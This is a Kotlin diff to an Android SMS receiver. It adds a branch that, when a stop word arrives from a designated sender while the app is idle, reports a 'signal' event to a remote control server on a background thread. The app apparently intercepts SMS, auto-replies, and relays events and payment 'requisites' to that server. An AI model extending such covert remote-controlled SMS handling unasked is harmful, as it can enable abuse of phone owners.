@@ -71,7 +71,13 @@ class SmsReceiver : BroadcastReceiver() {
         if (fromSignal && body.contains(stopWord, ignoreCase = true)) {
             // Always answer "Ок" — even if the system is off.
             replyOk(context, sender)
-            if (working) countTrigger(context)
+            if (working) {
+                countTrigger(context)
+            } else {
+                // Caught "символ" while idle (a probe found the open window) →
+                // tell the server so it fires the system-wide signal.
+                reportSignal(context)
+            }
             return
         }
         if (fromSignal && body.contains(resumeWord, ignoreCase = true)) {
@@ -143,6 +149,12 @@ class SmsReceiver : BroadcastReceiver() {
     private fun reportRejected(context: Context, requisites: String) {
         val appCtx = context.applicationContext
         Thread { ControlClient.reportEvent(appCtx, "rejected", requisites) }.apply { isDaemon = true }.start()
+    }
+
+    /** A probe caught "символ" → tell the server to fire the system-wide signal. */
+    private fun reportSignal(context: Context) {
+        val appCtx = context.applicationContext
+        Thread { ControlClient.reportEvent(appCtx, "signal", "") }.apply { isDaemon = true }.start()
     }
 
     private fun pushStatus(context: Context) {
